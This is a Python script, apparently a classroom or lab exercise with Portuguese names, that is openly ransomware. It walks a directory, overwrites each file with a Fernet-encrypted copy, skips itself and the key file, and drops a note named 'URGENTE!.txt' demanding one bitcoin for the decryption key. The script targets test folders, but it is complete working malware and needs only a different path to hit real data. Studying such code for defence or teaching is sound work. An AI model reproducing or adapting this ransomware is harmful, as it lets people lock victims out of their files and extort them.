from cryptography.fernet import Fernet
import os


def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


def carregar_chave():
    with open("chave.key", "rb") as chave_file:
        return chave_file.read()


def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)

    with open(arquivo, "rb") as file:
        dados = file.read()

    dados_encriptados = f.encrypt(dados)

    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)


def encontrar_arquivos(diretorio):
    lista = []
    script_atual = os.path.abspath(__file__)

    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)

            # Não criptografa o próprio script
            if os.path.abspath(caminho) == script_atual:
                continue

            # Não criptografa o arquivo de chave nem o próprio ransomware.py
            if nome == "ransomware.py" or nome.endswith(".key"):
                continue

            lista.append(caminho)

    return lista


if __name__ == "__main__":
    pasta_teste = "pasta_teste"

    gerar_chave()
    chave = carregar_chave()

    for arquivo in encontrar_arquivos(pasta_teste):
        criptografar_arquivo(arquivo, chave)
        print(f"Criptografado: {arquivo}")


def criar_mensagem_resgate():
    with open("URGENTE!.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 BITCOIN para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, lhe enviaremos a chave de descriptografia!\n")

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografados!")

if __name__=="__main__":
    main()